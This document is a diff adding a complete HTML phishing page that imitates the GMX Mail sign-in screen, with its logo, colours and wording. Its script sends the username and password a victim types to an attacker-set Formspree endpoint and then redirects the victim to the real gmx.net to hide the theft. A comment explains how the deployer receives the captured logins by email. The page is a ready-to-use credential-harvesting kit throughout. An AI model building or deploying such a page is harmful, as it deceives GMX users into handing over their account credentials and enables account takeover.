@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>GMX Login</title>
+<style>
+  /* Reset */
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #0050a4; /* GMX Blue */
+    color: #000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    max-height: 600px;
+    overflow: hidden;
+  }
+  .container {
+    background: #fff;
+    padding: 2rem 1.5rem;
+    width: 320px;
+    border-radius: 8px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+  }
+  .logo {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 2rem;
+  }
+  .logo img {
+    max-width: 140px;
+    height: auto;
+  }
+  h1 {
+    text-align: center;
+    font-weight: 700;
+    margin: 0 0 1.5rem 0;
+    font-size: 1.5rem;
+    color: #0050a4;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+  label {
+    font-weight: 600;
+    font-size: 0.9rem;
+    margin-bottom: 0.3rem;
+    color: #333;
+  }
+  input[type="text"],
+  input[type="password"] {
+    padding: 0.6rem 0.8rem;
+    margin-bottom: 1.1rem;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 1rem;
+    outline: none;
+    transition: border-color 0.3s ease;
+  }
+  input[type="text"]::placeholder,
+  input[type="password"]::placeholder {
+    color: #888;
+  }
+  input[type="text"]:focus,
+  input[type="password"]:focus {
+    border-color: #0050a4;
+  }
+  /* Honeypot field - hide it visually */
+  .honeypot {
+    position: absolute !important;
+    left: -9999px !important;
+    top: -9999px !important;
+    height: 0 !important;
+    width: 0 !important;
+    overflow: hidden !important;
+  }
+  button {
+    background-color: #0050a4;
+    border: none;
+    color: #fff;
+    font-weight: 700;
+    padding: 0.75rem 0;
+    font-size: 1.1rem;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    margin-bottom: 1.5rem;
+  }
+  button:hover,
+  button:focus {
+    background-color: #003b70;
+  }
+  .footer-links {
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.85rem;
+  }
+  .footer-links a {
+    color: #0050a4;
+    text-decoration: none;
+    transition: color 0.3s ease;
+  }
+  .footer-links a:hover,
+  .footer-links a:focus {
+    color: #002850;
+  }
+  @media (max-width: 380px) {
+    .container {
+      width: 90vw;
+      padding: 1.5rem 1rem;
+    }
+    h1 {
+      font-size: 1.3rem;
+    }
+  }
+</style>
+<script>
+  // Client side validation & honeypot to deter spam bots
+  function validateForm(event) {
+    event.preventDefault();
+    const form = event.target;
+    const honeypot = form.querySelector('#website');
+    if (honeypot.value) {
+      // spam bot detected - silently stop
+      return false;
+    }
+    const username = form.username.value.trim();
+    const password = form.password.value.trim();
+    if (!username) {
+      alert("Please enter your GMX username or email.");
+      form.username.focus();
+      return false;
+    }
+    if (!password) {
+      alert("Please enter your password.");
+      form.password.focus();
+      return false;
+    }
+    // send form data with fetch to Formspree or other endpoint
+    fetch(form.action, {
+      method: 'POST',
+      body: new FormData(form),
+      headers: {
+        'Accept': 'application/json'
+      }
+    }).then(response => {
+      if (response.ok) {
+        // Redirect to official GMX website after successful submission
+        window.location.href = 'https://www.gmx.net/';
+      } else {
+        response.json().then(data => {
+          if(data && data.errors) {
+            alert(data.errors.map(e => e.message).join(", "));
+          } else {
+            alert("Error submitting the form.");
+          }
+        });
+      }
+    }).catch(() => alert("Error submitting the form."));
+    return false;
+  }
+</script>
+</head>
+<body>
+  <div class="container" role="main" aria-label="GMX login page">
+    <div class="logo" aria-label="GMX logo">
+      <!-- GMX logo placeholder -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/GMX_Logo.svg/2560px-GMX_Logo.svg.png" alt="GMX Logo" />
+    </div>
+    <h1>Sign in to GMX Mail</h1>
+    <!--
+      IMPORTANT: Replace the form action URL below with your Formspree form endpoint to receive submissions to your email
+      To set up:
+      1. Go to https://formspree.io/
+      2. Sign up / login
+      3. Create a form with your email address
+      4. Replace 'yourFormID' below with your actual Formspree form endpoint
+    -->
+    <form aria-label="GMX login form" onsubmit="return validateForm(event)"
+      action="https://formspree.io/f/yourFormID" method="POST" novalidate>
+      
+      <label for="username">GMX Username or Email</label>
+      <input type="text" id="username" name="username" placeholder="Enter your GMX username or email" autocomplete="username" required />
+      
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required />
+      
+      <!-- Honeypot field for spam bots -->
+      <label class="honeypot" for="website">Website</label>
+      <input type="text" id="website" name="website" class="honeypot" autocomplete="off" tabindex="-1" aria-hidden="true" />
+      
+      <button type="submit">Log In</button>
+    </form>
+    <div class="footer-links">
+      <a href="#" tabindex="0">Forgot password?</a>
+      <a href="#" tabindex="0">Create GMX Account</a>
+    </div>
+  </div>
+</body>
+</html>
+
